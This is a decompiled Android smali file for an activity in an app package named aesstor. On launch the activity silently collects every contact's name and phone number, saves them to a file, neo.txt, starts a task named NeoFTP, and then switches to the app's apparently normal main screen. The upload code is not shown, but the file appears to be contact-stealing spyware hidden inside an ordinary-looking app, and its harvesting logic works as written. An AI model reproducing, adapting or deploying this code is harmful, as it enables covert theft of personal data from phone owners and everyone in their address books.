.class public Lcom/example/xavier/aesstor/MainActivityNew;
.super Landroid/support/v7/app/AppCompatActivity;
.source "MainActivityNew.java"


# static fields
.field static final FILENAME:Ljava/lang/String; = "neo.txt"

.field private static final REQUEST_READ_CONTACTS:I

.field static context:Landroid/content/Context;


# instance fields
.field final LOG_TAG:Ljava/lang/String;

.field public arr:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public myFilePath:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 26
    invoke-direct {p0}, Landroid/support/v7/app/AppCompatActivity;-><init>()V

    .line 31
    const-string v0, "myLogs"

    iput-object v0, p0, Lcom/example/xavier/aesstor/MainActivityNew;->LOG_TAG:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public getContacts()V
    .locals 24

    .line 90
    move-object/from16 v0, p0

    const/4 v1, 0x0

    .line 92
    .local v1, "phoneNumber":Ljava/lang/String;
    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    iput-object v2, v0, Lcom/example/xavier/aesstor/MainActivityNew;->arr:Ljava/util/ArrayList;

    .line 94
    sget-object v2, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    .line 95
    .local v2, "CONTENT_URI":Landroid/net/Uri;
    const-string v9, "_id"

    .line 96
    .local v9, "_ID":Ljava/lang/String;
    const-string v10, "display_name"

    .line 97
    .local v10, "DISPLAY_NAME":Ljava/lang/String;
    const-string v11, "has_phone_number"

    .line 99
    .local v11, "HAS_PHONE_NUMBER":Ljava/lang/String;
    sget-object v12, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    .line 100
    .local v12, "PhoneCONTENT_URI":Landroid/net/Uri;
    const-string v13, "contact_id"

    .line 101
    .local v13, "Phone_CONTACT_ID":Ljava/lang/String;
    const-string v14, "data1"

    .line 103
    .local v14, "NUMBER":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuffer;

    invoke-direct {v3}, Ljava/lang/StringBuffer;-><init>()V

    move-object v15, v3

    .line 104
    .local v15, "output":Ljava/lang/StringBuffer;
    invoke-virtual/range {p0 .. p0}, Lcom/example/xavier/aesstor/MainActivityNew;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v16

    .line 105
    .local v16, "contentResolver":Landroid/content/ContentResolver;
    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    move-object/from16 v3, v16

    move-object v4, v2

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v8

    .line 107
    .local v8, "cursor":Landroid/database/Cursor;
    invoke-interface {v8}, Landroid/database/Cursor;->getCount()I

    move-result v3

    if-lez v3, :cond_3

    .line 108
    :goto_0
    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_2

    .line 109
    invoke-interface {v8, v9}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v8, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v17

    .line 110
    .local v17, "contact_id":Ljava/lang/String;
    invoke-interface {v8, v10}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v8, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 111
    .local v7, "name":Ljava/lang/String;
    invoke-interface {v8, v11}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v8, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v18

    .line 113
    .local v18, "hasPhoneNumber":I
    if-lez v18, :cond_0

    .line 114
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "\n Name: "

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v15, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 115
    const/4 v5, 0x0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " =?"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/String;

    const/4 v3, 0x0

    aput-object v17, v4, v3

    const/16 v20, 0x0

    move-object/from16 v3, v16

    move-object/from16 v21, v4

    move-object v4, v12

    move-object/from16 v22, v6

    move-object/from16 v6, v19

    move-object/from16 v23, v7

    .end local v7    # "name":Ljava/lang/String;
    .local v23, "name":Ljava/lang/String;
    move-object/from16 v7, v21

    move-object/from16 v19, v8

    .end local v8    # "cursor":Landroid/database/Cursor;
    .local v19, "cursor":Landroid/database/Cursor;
    move-object/from16 v8, v20

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    .line 118
    .local v3, "phoneCursor":Landroid/database/Cursor;
    iget-object v4, v0, Lcom/example/xavier/aesstor/MainActivityNew;->arr:Ljava/util/ArrayList;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v6, v22

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v6, v23

    .end local v23    # "name":Ljava/lang/String;
    .local v6, "name":Ljava/lang/String;
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 120
    :goto_1
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-eqz v4, :cond_1

    .line 121
    invoke-interface {v3, v14}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v3, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    .line 122
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "\n \u0422\u0435\u043b\u0435\u0444\u043e\u043d: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v15, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 124
    iget-object v4, v0, Lcom/example/xavier/aesstor/MainActivityNew;->arr:Ljava/util/ArrayList;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_1

    .line 113
    .end local v3    # "phoneCursor":Landroid/database/Cursor;
    .end local v6    # "name":Ljava/lang/String;
    .end local v19    # "cursor":Landroid/database/Cursor;
    .restart local v7    # "name":Ljava/lang/String;
    .restart local v8    # "cursor":Landroid/database/Cursor;
    :cond_0
    move-object v6, v7

    move-object/from16 v19, v8

    .line 128
    .end local v7    # "name":Ljava/lang/String;
    .end local v8    # "cursor":Landroid/database/Cursor;
    .restart local v6    # "name":Ljava/lang/String;
    .restart local v19    # "cursor":Landroid/database/Cursor;
    :cond_1
    const-string v3, "\n"

    invoke-virtual {v15, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 129
    iget-object v4, v0, Lcom/example/xavier/aesstor/MainActivityNew;->arr:Ljava/util/ArrayList;

    invoke-virtual {v4, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 130
    .end local v6    # "name":Ljava/lang/String;
    .end local v17    # "contact_id":Ljava/lang/String;
    .end local v18    # "hasPhoneNumber":I
    move-object/from16 v8, v19

    goto/16 :goto_0

    .line 108
    .end local v19    # "cursor":Landroid/database/Cursor;
    .restart local v8    # "cursor":Landroid/database/Cursor;
    :cond_2
    move-object/from16 v19, v8

    .end local v8    # "cursor":Landroid/database/Cursor;
    .restart local v19    # "cursor":Landroid/database/Cursor;
    goto :goto_2

    .line 107
    .end local v19    # "cursor":Landroid/database/Cursor;
    .restart local v8    # "cursor":Landroid/database/Cursor;
    :cond_3
    move-object/from16 v19, v8

    .line 133
    .end local v8    # "cursor":Landroid/database/Cursor;
    .restart local v19    # "cursor":Landroid/database/Cursor;
    :goto_2
    invoke-virtual {v0, v15}, Lcom/example/xavier/aesstor/MainActivityNew;->writeFile(Ljava/lang/StringBuffer;)V

    .line 135
    return-void
.end method

.method public mayRequestContacts()Z
    .locals 3

    .line 64
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/4 v1, 0x1

    const/16 v2, 0x17

    if-ge v0, v2, :cond_0

    .line 65
    return v1

    .line 67
    :cond_0
    const-string v0, "android.permission.READ_CONTACTS"

    invoke-virtual {p0, v0}, Lcom/example/xavier/aesstor/MainActivityNew;->checkSelfPermission(Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_1

    .line 68
    return v1

    .line 70
    :cond_1
    invoke-virtual {p0, v0}, Lcom/example/xavier/aesstor/MainActivityNew;->shouldShowRequestPermissionRationale(Ljava/lang/String;)Z

    move-result v1

    const/4 v2, 0x0

    if-eqz v1, :cond_2

    .line 71
    filled-new-array {v0}, [Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v2}, Lcom/example/xavier/aesstor/MainActivityNew;->requestPermissions([Ljava/lang/String;I)V

    goto :goto_0

    .line 73
    :cond_2
    filled-new-array {v0}, [Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v2}, Lcom/example/xavier/aesstor/MainActivityNew;->requestPermissions([Ljava/lang/String;I)V

    .line 75
    :goto_0
    return v2
.end method

.method public myDir()Ljava/lang/String;
    .locals 2

    .line 156
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lcom/example/xavier/aesstor/MainActivityNew;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v1, "/neo.txt"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "ResourceType"
        }
    .end annotation

    .line 41
    invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 42
    const v0, 0x7f09001d

    invoke-virtual {p0, v0}, Lcom/example/xavier/aesstor/MainActivityNew;->setContentView(I)V

    .line 44
    invoke-virtual {p0}, Lcom/example/xavier/aesstor/MainActivityNew;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lcom/example/xavier/aesstor/MainActivityNew;->context:Landroid/content/Context;

    .line 45
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Lcom/example/xavier/aesstor/MainActivityNew;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v1, "/neo.txt"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/example/xavier/aesstor/MainActivityNew;->myFilePath:Ljava/lang/String;

    .line 49
    invoke-virtual {p0}, Lcom/example/xavier/aesstor/MainActivityNew;->mayRequestContacts()Z

    .line 51
    invoke-virtual {p0}, Lcom/example/xavier/aesstor/MainActivityNew;->getContacts()V

    .line 53
    new-instance v0, Lcom/example/xavier/aesstor/NeoFTP;

    invoke-direct {v0}, Lcom/example/xavier/aesstor/NeoFTP;-><init>()V

    .line 54
    .local v0, "neoFTP":Lcom/example/xavier/aesstor/NeoFTP;
    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/example/xavier/aesstor/NeoFTP;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 56
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/example/xavier/aesstor/MainActivity;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 57
    .local v1, "intent":Landroid/content/Intent;
    invoke-virtual {p0, v1}, Lcom/example/xavier/aesstor/MainActivityNew;->startActivity(Landroid/content/Intent;)V

    .line 61
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 2
    .param p1, "requestCode"    # I
    .param p2, "permissions"    # [Ljava/lang/String;
        .annotation build Landroid/support/annotation/NonNull;
        .end annotation
    .end param
    .param p3, "grantResults"    # [I
        .annotation build Landroid/support/annotation/NonNull;
        .end annotation
    .end param

    .line 81
    if-nez p1, :cond_0

    .line 82
    array-length v0, p3

    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    const/4 v0, 0x0

    aget v0, p3, v0

    if-nez v0, :cond_0

    .line 84
    invoke-virtual {p0}, Lcom/example/xavier/aesstor/MainActivityNew;->getContacts()V

    .line 87
    :cond_0
    return-void
.end method

.method writeFile(Ljava/lang/StringBuffer;)V
    .locals 4
    .param p1, "str"    # Ljava/lang/StringBuffer;

    .line 139
    :try_start_0
    new-instance v0, Ljava/io/BufferedWriter;

    new-instance v1, Ljava/io/OutputStreamWriter;

    const-string v2, "neo.txt"

    const/4 v3, 0x0

    .line 140
    invoke-virtual {p0, v2, v3}, Lcom/example/xavier/aesstor/MainActivityNew;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    .line 143
    .local v0, "bw":Ljava/io/BufferedWriter;
    invoke-virtual {p1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    .line 145
    invoke-virtual {v0}, Ljava/io/BufferedWriter;->close()V

    .line 147
    const-string v1, "myLogs"

    const-string v2, "File done"

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 152
    nop

    .end local v0    # "bw":Ljava/io/BufferedWriter;
    goto :goto_0

    .line 150
    :catch_0
    move-exception v0

    .line 151
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 148
    .end local v0    # "e":Ljava/io/IOException;
    :catch_1
    move-exception v0

    .line 149
    .local v0, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v0}, Ljava/io/FileNotFoundException;->printStackTrace()V

    .line 152
    .end local v0    # "e":Ljava/io/FileNotFoundException;
    nop

    .line 153
    :goto_0
    return-void
.end method
